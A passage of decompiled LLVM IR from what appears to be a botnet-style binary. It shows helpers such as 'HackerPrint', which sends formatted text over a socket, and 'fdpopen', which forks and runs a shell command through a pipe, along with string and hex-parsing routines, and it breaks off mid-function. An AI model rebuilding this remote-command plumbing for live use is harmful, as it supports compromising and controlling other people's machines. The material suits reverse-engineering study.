dec_label_pc_8b8c:                                ; preds = %dec_label_pc_8b7c
  %v1_8b90 = add i32 %stack_var_-36.133, 4
  %v1_8b9c = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8b9c = load i32, i32* %v1_8b9c, align 4
  %v7_8bc8 = call i32 @printi(i32 %tmp, i32 %v2_8b9c, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 65)
  %v2_8bd4 = add i32 %v7_8bc8, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8be0:                                ; preds = %dec_label_pc_8b7c
  %v2_8be4 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8be8 = icmp eq i8 %v2_8be4, 117
  br i1 %v7_8be8, label %dec_label_pc_8bf0, label %dec_label_pc_8c44

dec_label_pc_8bf0:                                ; preds = %dec_label_pc_8be0
  %v1_8bf4 = add i32 %stack_var_-36.133, 4
  %v1_8c00 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8c00 = load i32, i32* %v1_8c00, align 4
  %v7_8c2c = call i32 @printi(i32 %tmp, i32 %v2_8c00, i32 10, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8c38 = add i32 %v7_8c2c, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8c44:                                ; preds = %dec_label_pc_8be0
  %v2_8c48 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8c4c = icmp eq i8 %v2_8c48, 99
  br i1 %v7_8c4c, label %dec_label_pc_8c54, label %dec_label_pc_8cc4

dec_label_pc_8c54:                                ; preds = %dec_label_pc_8c44
  %v1_8c58 = add i32 %stack_var_-36.133, 4
  %v1_8c64 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8c64 = load i32, i32* %v1_8c64, align 4
  %v1_8c68 = urem i32 %v2_8c64, 256
  store i32 %v1_8c68, i32* %stack_var_-18, align 4
  %v6_8c8c = call i32 @prints(i32 %tmp, i8* %v5_8c8c, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 %v1_8c58)
  %v2_8c98 = add i32 %v6_8c8c, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8ca4:                                ; preds = %dec_label_pc_8948, %dec_label_pc_8984
  %stack_var_-32.2 = phi i8* [ %v5_8960, %dec_label_pc_8984 ], [ %stack_var_-32.435, %dec_label_pc_8948 ]
  %v2_8ca8 = load i8, i8* %stack_var_-32.2, align 1
  %v3_8ca8 = zext i8 %v2_8ca8 to i32
  %v3_8cb4 = call i32 @printchar(i32* %arg1, i32 %v3_8ca8)
  %v1_8cbc = add i32 %stack_var_-44.132, 1
  br label %dec_label_pc_8cc4

dec_label_pc_8cc4:                                ; preds = %dec_label_pc_8c44, %dec_label_pc_8c54, %dec_label_pc_8bf0, %dec_label_pc_8b8c, %dec_label_pc_8b28, %dec_label_pc_8a88, %dec_label_pc_8ac4, %dec_label_pc_8ca4
  %stack_var_-44.0 = phi i32 [ %v1_8cbc, %dec_label_pc_8ca4 ], [ %v2_8aa8, %dec_label_pc_8a88 ], [ %v2_8b0c, %dec_label_pc_8ac4 ], [ %v2_8b70, %dec_label_pc_8b28 ], [ %v2_8bd4, %dec_label_pc_8b8c ], [ %v2_8c38, %dec_label_pc_8bf0 ], [ %v2_8c98, %dec_label_pc_8c54 ], [ %stack_var_-44.132, %dec_label_pc_8c44 ]
  %stack_var_-36.0 = phi i32 [ %stack_var_-36.133, %dec_label_pc_8ca4 ], [ %v1_8a54, %dec_label_pc_8a88 ], [ %v1_8ac8, %dec_label_pc_8ac4 ], [ %v1_8b2c, %dec_label_pc_8b28 ], [ %v1_8b90, %dec_label_pc_8b8c ], [ %v1_8bf4, %dec_label_pc_8bf0 ], [ %v1_8c58, %dec_label_pc_8c54 ], [ %stack_var_-36.133, %dec_label_pc_8c44 ]
  %stack_var_-32.3 = phi i8* [ %stack_var_-32.2, %dec_label_pc_8ca4 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8a88 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8ac4 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8b28 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8b8c ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8bf0 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8c54 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8c44 ]
  %v4_8cc4 = ptrtoint i8* %stack_var_-32.3 to i32
  %v1_8cc8 = add i32 %v4_8cc4, 1
  %stack_var_-32.4 = inttoptr i32 %v1_8cc8 to i8*
  %v2_8cd4 = load i8, i8* %stack_var_-32.4, align 1
  %v2_8cd8 = icmp eq i8 %v2_8cd4, 0
  br i1 %v2_8cd8, label %dec_label_pc_8ce0, label %dec_label_pc_8948

dec_label_pc_8ce0:                                ; preds = %dec_label_pc_8958, %dec_label_pc_8cc4, %entry
  %stack_var_-44.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-44.132, %dec_label_pc_8958 ], [ %stack_var_-44.0, %dec_label_pc_8cc4 ]
  %v2_8ce4 = icmp eq i32* %arg1, null
  br i1 %v2_8ce4, label %dec_label_pc_8cfc, label %dec_label_pc_8cec

dec_label_pc_8cec:                                ; preds = %dec_label_pc_8ce0
  %v2_8cf0 = load i32, i32* %arg1, align 4
  %v3_8cf8 = inttoptr i32 %v2_8cf0 to i8*
  store i8 0, i8* %v3_8cf8, align 1
  br label %dec_label_pc_8cfc

dec_label_pc_8cfc:                                ; preds = %dec_label_pc_8ce0, %dec_label_pc_8cec
  ret i32 %stack_var_-44.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-32.4, { 1, 0 }
  uselistorder i8* %stack_var_-32.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-52.0.lcssa, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8* %stack_var_-32.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_89c0, { 1, 0 }
  uselistorder i32 %stack_var_-48.0.ph, { 1, 0 }
  uselistorder i8* %v5_8960, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-44.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-36.133, { 13, 0, 11, 12, 9, 10, 7, 8, 5, 6, 3, 4, 1, 2 }
  uselistorder i32 %stack_var_-32.4.in34, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-18, { 1, 0 }
  uselistorder i32 (i32*, i32)* @printchar, { 0, 4, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32, i32)* @prints, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_8cfc, { 1, 0 }
  uselistorder label %dec_label_pc_8ce0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8cc4, { 7, 1, 0, 2, 3, 4, 6, 5 }
  uselistorder label %dec_label_pc_8ca4, { 1, 0 }
  uselistorder label %dec_label_pc_8a88, { 1, 0 }
  uselistorder label %dec_label_pc_8a40, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8a30, { 1, 0 }
  uselistorder label %dec_label_pc_89bc, { 1, 0 }
  uselistorder label %dec_label_pc_8948, { 1, 0 }
}

define i32 @zprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-12, align 4
  store i32 36132, i32* %stack_var_-20, align 4
  %v2_8d20 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8d20, i32* @fp, align 4
  %v4_8d2c = ptrtoint i32* %stack_var_-12 to i32
  %v4_8d40 = call i32 @print(i32* null, i32 %arg1, i32 %v4_8d2c)
  ret i32 %v4_8d40

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8d60 = load i32, i32* @fp, align 4
  store i32 36200, i32* %stack_var_-16, align 4
  %v2_8d64 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d64, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-44, align 4
  %v2_8d70 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8d88 = call i32 @print(i32* nonnull %stack_var_-44, i32 %arg2, i32 %v2_8d70)
  store i32 %v3_8d60, i32* @fp, align 4
  ret i32 %v4_8d88

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @HackerPrint(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_8da4 = load i32, i32* @r2, align 4
  store i32 %v6_8da4, i32* %stack_var_-8, align 4
  %v3_8da8 = load i32, i32* @fp, align 4
  store i32 36272, i32* %stack_var_-16, align 4
  %v2_8dac = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8dac, i32* @fp, align 4
  %v1_8dbc = call i32 @malloc(i32 2048)
  store i32 %v1_8dbc, i32* %stack_var_-44, align 4
  store i32 2048, i32* @r2, align 4
  %v2_8dd8 = inttoptr i32 %v1_8dbc to i8*
  %v3_8dd8 = call i32 @__GI_memset(i8* %v2_8dd8, i32 0)
  %v2_8de4 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8e04 = call i32 @print(i32* nonnull %stack_var_-44, i32 %arg2, i32 %v2_8de4)
  %v3_8e0c = call i32 @strlen(i8* %v2_8dd8)
  %v2_8e1c = add i32 %v3_8e0c, %v1_8dbc
  %v3_8e24 = inttoptr i32 %v2_8e1c to i8*
  store i8 10, i8* %v3_8e24, align 1
  %v3_8e2c = call i32 @strlen(i8* %v2_8dd8)
  %v4_8e44 = call i32 @__libc_send(i32 %arg1, i32 %v1_8dbc, i32 %v3_8e2c, i32 16384)
  store i32 %v1_8dbc, i32* @r0, align 4
  %v0_8e54 = call i32 @free()
  store i32 %v3_8da8, i32* @fp, align 4
  ret i32 %v4_8e44

; uselistorder directives
  uselistorder i8* %v2_8dd8, { 1, 0, 2 }
  uselistorder i32 %v1_8dbc, { 1, 2, 0, 3, 4 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8e70 = load i32, i32* @fp, align 4
  store i32 36472, i32* %stack_var_-4, align 4
  %v2_8e74 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8e74, i32* @fp, align 4
  %v2_8e88 = load i8, i8* %arg2, align 1
  %v7_8e8c = icmp eq i8 %v2_8e88, 114
  br i1 %v7_8e8c, label %dec_label_pc_8ea4, label %dec_label_pc_8e94

dec_label_pc_8e94:                                ; preds = %entry
  %v2_8e98 = load i8, i8* %arg2, align 1
  %v7_8e9c = icmp eq i8 %v2_8e98, 119
  br i1 %v7_8e9c, label %dec_label_pc_8ea4, label %dec_label_pc_8eb8

dec_label_pc_8ea4:                                ; preds = %dec_label_pc_8e94, %entry
  %v1_8ea8 = add i32 %tmp, 1
  %v1_8eac = inttoptr i32 %v1_8ea8 to i8*
  %v2_8eac = load i8, i8* %v1_8eac, align 1
  %v2_8eb0 = icmp eq i8 %v2_8eac, 0
  br i1 %v2_8eb0, label %dec_label_pc_8ec4, label %dec_label_pc_8eb8

dec_label_pc_8eb8:                                ; preds = %dec_label_pc_8e94, %dec_label_pc_8ea4
  br label %dec_label_pc_90d0

dec_label_pc_8ec4:                                ; preds = %dec_label_pc_8ea4
  %v2_8ec4 = ptrtoint i32* %stack_var_-32 to i32
  %v1_8ecc = call i32 @__GI_pipe(i32 %v2_8ec4)
  store i32 %v1_8ecc, i32* @r0, align 4
  %v1_8ed4 = icmp slt i32 %v1_8ecc, 0
  br i1 %v1_8ed4, label %dec_label_pc_8edc, label %dec_label_pc_8ee8

dec_label_pc_8edc:                                ; preds = %dec_label_pc_8ec4
  br label %dec_label_pc_90d0

dec_label_pc_8ee8:                                ; preds = %dec_label_pc_8ec4
  %v2_8eec = load i32, i32* @global_var_324fc.32, align 4
  %v2_8ef0 = icmp eq i32 %v2_8eec, 0
  br i1 %v2_8ef0, label %dec_label_pc_8ef8, label %dec_label_pc_8f78

dec_label_pc_8ef8:                                ; preds = %dec_label_pc_8ee8
  %v0_8ef8 = call i32 @getdtablesize()
  %v5_8f0c = icmp sgt i32 %v0_8ef8, 0
  br i1 %v5_8f0c, label %dec_label_pc_8f1c, label %dec_label_pc_8f10

dec_label_pc_8f10:                                ; preds = %dec_label_pc_8ef8
  br label %dec_label_pc_90d0

dec_label_pc_8f1c:                                ; preds = %dec_label_pc_8ef8
  %v3_8f20 = mul i32 %v0_8ef8, 4
  %v1_8f28 = call i32 @malloc(i32 %v3_8f20)
  store i32 %v1_8f28, i32* @global_var_324fc.32, align 4
  %v2_8f44 = icmp eq i32 %v1_8f28, 0
  br i1 %v2_8f44, label %dec_label_pc_8f4c, label %dec_label_pc_8f58

dec_label_pc_8f4c:                                ; preds = %dec_label_pc_8f1c
  br label %dec_label_pc_90d0

dec_label_pc_8f58:                                ; preds = %dec_label_pc_8f1c
  store i32 %v3_8f20, i32* @r2, align 4
  %v2_8f74 = inttoptr i32 %v1_8f28 to i8*
  %v3_8f74 = call i32 @__GI_memset(i8* %v2_8f74, i32 0)
  store i32 %v3_8f74, i32* @r0, align 4
  br label %dec_label_pc_8f78

dec_label_pc_8f78:                                ; preds = %dec_label_pc_8ee8, %dec_label_pc_8f58
  %v0_8f78 = call i32 @__vfork()
  %v7_8f90 = icmp eq i32 %v0_8f78, -1
  br i1 %v7_8f90, label %dec_label_pc_8fa8, label %dec_label_pc_8f98

dec_label_pc_8f98:                                ; preds = %dec_label_pc_8f78
  %v2_8f9c = icmp eq i32 %v0_8f78, 0
  br i1 %v2_8f9c, label %dec_label_pc_8fcc, label %dec_label_pc_906c

dec_label_pc_8fa8:                                ; preds = %dec_label_pc_8f78
  %v3_8fa8 = load i32, i32* %stack_var_-32, align 4
  %v1_8fb0 = call i32 @__GI_close(i32 %v3_8fa8)
  %v1_8fbc = call i32 @__GI_close(i32 %tmp3)
  br label %dec_label_pc_90d0

dec_label_pc_8fcc:                                ; preds = %dec_label_pc_8f98
  %v3_8fd0 = load i8, i8* %arg2, align 1
  %v7_8fd4 = icmp eq i8 %v3_8fd0, 114
  br i1 %v7_8fd4, label %dec_label_pc_8fdc, label %dec_label_pc_9014

dec_label_pc_8fdc:                                ; preds = %dec_label_pc_8fcc
  %v7_8fe0 = icmp eq i32 %tmp3, 1
  br i1 %v7_8fe0, label %dec_label_pc_9004, label %dec_label_pc_8fe8

dec_label_pc_8fe8:                                ; preds = %dec_label_pc_8fdc
  %v4_8ff4 = call i32 @dup2(i32 %tmp3, i32 1, i32 %tmp)
  %v1_9000 = call i32 @__GI_close(i32 %tmp3)
  br label %dec_label_pc_9004

dec_label_pc_9004:                                ; preds = %dec_label_pc_8fdc, %dec_label_pc_8fe8
  %v3_9004 = load i32, i32* %stack_var_-32, align 4
  %v1_900c = call i32 @__GI_close(i32 %v3_9004)
  br label %dec_label_pc_9048

dec_label_pc_9014:                                ; preds = %dec_label_pc_8fcc
  %v3_9014 = load i32, i32* %stack_var_-32, align 4
  %v2_9018 = icmp eq i32 %v3_9014, 0
  br i1 %v2_9018, label %dec_label_pc_903c, label %dec_label_pc_9020

dec_label_pc_9020:                                ; preds = %dec_label_pc_9014
  %v4_902c = call i32 @dup2(i32 %v3_9014, i32 0, i32 %tmp)
  %v3_9030 = load i32, i32* %stack_var_-32, align 4
  %v1_9038 = call i32 @__GI_close(i32 %v3_9030)
  br label %dec_label_pc_903c

dec_label_pc_903c:                                ; preds = %dec_label_pc_9014, %dec_label_pc_9020
  %v1_9044 = call i32 @__GI_close(i32 %tmp3)
  br label %dec_label_pc_9048

dec_label_pc_9048:                                ; preds = %dec_label_pc_9004, %dec_label_pc_903c
  %v8_9060 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1fba4.34 to i32), i32 ptrtoint ([3 x i8]* @global_var_1fbac.36 to i32), i32 ptrtoint ([3 x i8]* @global_var_1fbb0.38 to i32), i32 %arg1, i32 0)
  %v1_9068 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_906c

dec_label_pc_906c:                                ; preds = %dec_label_pc_8f98, %dec_label_pc_9048
  %v2_9070 = load i8, i8* %arg2, align 1
  %v7_9074 = icmp eq i8 %v2_9070, 114
  br i1 %v7_9074, label %dec_label_pc_907c, label %dec_label_pc_9094

dec_label_pc_907c:                                ; preds = %dec_label_pc_906c
  %v3_907c = load i32, i32* %stack_var_-32, align 4
  %v1_908c = call i32 @__GI_close(i32 %tmp3)
  br label %dec_label_pc_90a8

dec_label_pc_9094:                                ; preds = %dec_label_pc_906c
  %v3_909c = load i32, i32* %stack_var_-32, align 4
  %v1_90a4 = call i32 @__GI_close(i32 %v3_909c)
  br label %dec_label_pc_90a8

dec_label_pc_90a8:                                ; preds = %dec_label_pc_907c, %dec_label_pc_9094
  %stack_var_-40.0 = phi i32 [ %v3_907c, %dec_label_pc_907c ], [ %tmp3, %dec_label_pc_9094 ]
  %v3_90ac = mul i32 %stack_var_-40.0, 4
  %v2_90b8 = load i32, i32* @global_var_324fc.32, align 4
  %v2_90bc = add i32 %v2_90b8, %v3_90ac
  %v2_90c4 = inttoptr i32 %v2_90bc to i32*
  store i32 %v0_8f78, i32* %v2_90c4, align 4
  br label %dec_label_pc_90d0

dec_label_pc_90d0:                                ; preds = %dec_label_pc_8fa8, %dec_label_pc_8f4c, %dec_label_pc_8f10, %dec_label_pc_8edc, %dec_label_pc_8eb8, %dec_label_pc_90a8
  %stack_var_-44.0 = phi i32 [ -1, %dec_label_pc_8edc ], [ -1, %dec_label_pc_8f4c ], [ -1, %dec_label_pc_8fa8 ], [ %stack_var_-40.0, %dec_label_pc_90a8 ], [ -1, %dec_label_pc_8f10 ], [ -1, %dec_label_pc_8eb8 ]
  store i32 %v3_8e70, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v0_8f78, { 1, 2, 0 }
  uselistorder i32 %v3_8f20, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @dup2, { 1, 0 }
  uselistorder i8* %arg2, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_90d0, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_90a8, { 1, 0 }
  uselistorder label %dec_label_pc_906c, { 1, 0 }
  uselistorder label %dec_label_pc_9048, { 1, 0 }
  uselistorder label %dec_label_pc_903c, { 1, 0 }
  uselistorder label %dec_label_pc_9004, { 1, 0 }
  uselistorder label %dec_label_pc_8f78, { 1, 0 }
  uselistorder label %dec_label_pc_8eb8, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v2_910c = load i32, i32* @global_var_324fc.32, align 4
  %v2_9110 = icmp eq i32 %v2_910c, 0
  br i1 %v2_9110, label %dec_label_pc_9264, label %dec_label_pc_9118

dec_label_pc_9118:                                ; preds = %entry
  %v3_911c = mul i32 %arg1, 4
  %v2_912c = add i32 %v2_910c, %v3_911c
  %v1_9130 = inttoptr i32 %v2_912c to i32*
  %v2_9130 = load i32, i32* %v1_9130, align 4
  %v2_9134 = icmp eq i32 %v2_9130, 0
  br i1 %v2_9134, label %dec_label_pc_9264, label %dec_label_pc_9148

dec_label_pc_9148:                                ; preds = %dec_label_pc_9118
  %v1_914c = call i32 @__GI_close(i32 %arg1)
  %v2_9150 = ptrtoint i32* %stack_var_-36 to i32
  %v2_9158 = call i32 @sigemptyset(i32* nonnull %stack_var_-36)
  store i32 %v2_9150, i32* @r0, align 4
  %v2_9168 = call i32 @__GI_sigaddset(i32 %v2_9150, i32 2)
  store i32 %v2_9150, i32* @r0, align 4
  %v2_9178 = call i32 @__GI_sigaddset(i32 %v2_9150, i32 3)
  store i32 %v2_9150, i32* @r0, align 4
  %v2_9188 = call i32 @__GI_sigaddset(i32 %v2_9150, i32 1)
  %v2_9190 = ptrtoint i32* %stack_var_-28 to i32
  %v4_919c = call i32 @__GI_sigprocmask(i32 0, i32 %v2_9150, i32 %v2_9190, i32 %v2_9150)
  %v2_91bc = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_91a0

dec_label_pc_91a0:                                ; preds = %dec_label_pc_91e4, %dec_label_pc_9148
  %v2_91b0 = load i32, i32* @global_var_324fc.32, align 4
  %v2_91b4 = add i32 %v2_91b0, %v3_911c
  %v1_91b8 = inttoptr i32 %v2_91b4 to i32*
  %v2_91b8 = load i32, i32* %v1_91b8, align 4
  store i32 %v2_91b8, i32* @r0, align 4
  store i32 %v2_91bc, i32* @r1, align 4
  %v3_91cc = call i32 @__libc_waitpid(i32 %v2_91b8, i32 %v2_91bc, i32 0)
  %v3_91dc = icmp eq i32 %v3_91cc, -1
  %v8_91dc = icmp eq i32 %v3_91cc, -1
  br i1 %v3_91dc, label %dec_label_pc_91e4, label %dec_label_pc_91f8

dec_label_pc_91e4:                                ; preds = %dec_label_pc_91a0
  %v0_91e4 = call i32 @__GI___errno_location()
  %v1_91ec = inttoptr i32 %v0_91e4 to i32*
  %v2_91ec = load i32, i32* %v1_91ec, align 4
  %v7_91f0 = icmp eq i32 %v2_91ec, 4
  br i1 %v7_91f0, label %dec_label_pc_91a0, label %dec_label_pc_91f8

dec_label_pc_91f8:                                ; preds = %dec_label_pc_91a0, %dec_label_pc_91e4
  %v4_9208 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_9190, i32 0, i32 %v2_9190)
  %v3_9210 = mul i32 %tmp5, 4
  %v2_921c = load i32, i32* @global_var_324fc.32, align 4
  %v2_9220 = add i32 %v2_921c, %v3_9210
  %v2_9228 = inttoptr i32 %v2_9220 to i32*
  store i32 0, i32* %v2_9228, align 4
  br i1 %v8_91dc, label %dec_label_pc_9264, label %dec_label_pc_9238

dec_label_pc_9238:                                ; preds = %dec_label_pc_91f8
  %v3_9238 = load i32, i32* %stack_var_-40, align 4
  %v1_9244 = and i32 %v3_9238, ptrtoint (i32* @global_var_ff00.40 to i32)
  %v3_9248 = sdiv i32 %v1_9244, 256
  br label %dec_label_pc_9264

dec_label_pc_9264:                                ; preds = %dec_label_pc_9238, %dec_label_pc_91f8, %entry, %dec_label_pc_9118
  %storemerge = phi i32 [ -1, %dec_label_pc_9118 ], [ -1, %entry ], [ %v3_9248, %dec_label_pc_9238 ], [ -1, %dec_label_pc_91f8 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_91bc, { 1, 0 }
  uselistorder i32 %v2_9190, { 1, 0, 2 }
  uselistorder i32 %v2_9150, { 0, 1, 3, 2, 5, 4, 7, 6 }
  uselistorder i32 %v3_911c, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32* @global_var_324fc.32, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9264, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_91f8, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  br label %dec_label_pc_92ec

dec_label_pc_92ac:                                ; preds = %dec_label_pc_92fc
  %v1_92c8 = call i32 @__GI_read(i32 %arg3)
  %v1_92d8 = add nuw i32 %storemerge25, 1
  %v7_92e4 = icmp eq i32 %v1_92c8, 1
  br i1 %v7_92e4, label %dec_label_pc_92ec, label %dec_label_pc_931c

dec_label_pc_92ec:                                ; preds = %entry, %dec_label_pc_92ac
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_92d8, %dec_label_pc_92ac ]
  %v6_92f8 = icmp slt i32 %storemerge25, %arg2
  br i1 %v6_92f8, label %dec_label_pc_92fc, label %dec_label_pc_931c

dec_label_pc_92fc:                                ; preds = %dec_label_pc_92ec
  %v2_9308 = add i32 %storemerge25, %arg1
  %v1_930c = add i32 %v2_9308, -1
  %v1_9310 = inttoptr i32 %v1_930c to i8*
  %v2_9310 = load i8, i8* %v1_9310, align 1
  %v7_9314 = icmp eq i8 %v2_9310, 10
  br i1 %v7_9314, label %dec_label_pc_931c, label %dec_label_pc_92ac

dec_label_pc_931c:                                ; preds = %dec_label_pc_92fc, %dec_label_pc_92ec, %dec_label_pc_92ac
  %stack_var_-24.0.lcssa = phi i32 [ 1, %dec_label_pc_92fc ], [ 1, %dec_label_pc_92ec ], [ %v1_92c8, %dec_label_pc_92ac ]
  %v2_9320 = icmp eq i32 %stack_var_-24.0.lcssa, 0
  %storemerge3 = select i1 %v2_9320, i32 0, i32 %arg1
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v1_92c8, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_92ec, { 1, 0 }
}

define i32 @parseHex(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_93a43 = load i8, i8* %arg1, align 1
  %v2_93a85 = icmp eq i8 %v2_93a43, 0
  br i1 %v2_93a85, label %dec_label_pc_93bc, label %dec_label_pc_93b0

dec_label_pc_9370:                                ; preds = %dec_label_pc_93b0
  %v3_9374 = mul i32 %stack_var_-20.07, 16
  %v2_937c = load i8, i8* %stack_var_-28.06, align 1
  %v3_937c = zext i8 %v2_937c to i32
  %v4_9388 = mul nuw nsw i32 %v3_937c, 4
  %v5_9388 = add i32 %v4_9388, ptrtoint (i32* @global_var_1fbb4.42 to i32)
  %v6_9388 = inttoptr i32 %v5_9388 to i32*
  %v7_9388 = load i32, i32* %v6_9388, align 4
  %v2_938c = or i32 %v7_9388, %v3_9374
  %v1_9398 = add i32 %v4_93a08, 1
  %v5_939c = inttoptr i32 %v1_9398 to i8*
  %v2_93a4 = load i8, i8* %v5_939c, align 1
  %v2_93a8 = icmp eq i8 %v2_93a4, 0
  br i1 %v2_93a8, label %dec_label_pc_93bc, label %dec_label_pc_93b0

dec_label_pc_93b0:                                ; preds = %entry, %dec_label_pc_9370
  %v4_93a08 = phi i32 [ %v1_9398, %dec_label_pc_9370 ], [ %tmp, %entry ]
  %stack_var_-20.07 = phi i32 [ %v2_938c, %dec_label_pc_9370 ], [ 0, %entry ]
  %stack_var_-28.06 = phi i8* [ %v5_939c, %dec_label_pc_9370 ], [ %arg1, %entry ]
  %v1_93b4 = icmp slt i32 %stack_var_-20.07, 0
  br i1 %v1_93b4, label %dec_label_pc_93bc, label %dec_label_pc_9370

dec_label_pc_93bc:                                ; preds = %dec_label_pc_9370, %dec_label_pc_93b0, %entry
  %stack_var_-20.0.lcssa = phi i32 [ 0, %entry ], [ %v2_938c, %dec_label_pc_9370 ], [ %stack_var_-20.07, %dec_label_pc_93b0 ]
  ret i32 %stack_var_-20.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-20.07, { 1, 2, 0 }
  uselistorder label %dec_label_pc_93bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_93b0, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_93d8 = load i32, i32* @r4, align 4
  %v6_93d8 = load i32, i32* @fp, align 4
  store i32 37856, i32* %stack_var_-4, align 4
  %v2_93dc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_93dc, i32* @fp, align 4
  %v2_93f0 = load i8, i8* %arg1, align 1
  %v7_93fc = icmp eq i8 %v2_93f0, 42
  br i1 %v7_93fc, label %dec_label_pc_9430, label %dec_label_pc_9404

dec_label_pc_9404:                                ; preds = %entry
  %v7_9408 = icmp eq i8 %v2_93f0, 63
  br i1 %v7_9408, label %dec_label_pc_94a0, label %dec_label_pc_9410

dec_label_pc_9410:                                ; preds = %dec_label_pc_9404
  %v2_9414 = icmp eq i8 %v2_93f0, 0
  br i1 %v2_9414, label %dec_label_pc_9420, label %dec_label_pc_94f8

dec_label_pc_9420:                                ; preds = %dec_label_pc_9410
  %v2_9424 = load i8, i8* %tmp, align 1
  %v3_9424 = zext i8 %v2_9424 to i32
  br label %dec_label_pc_956c

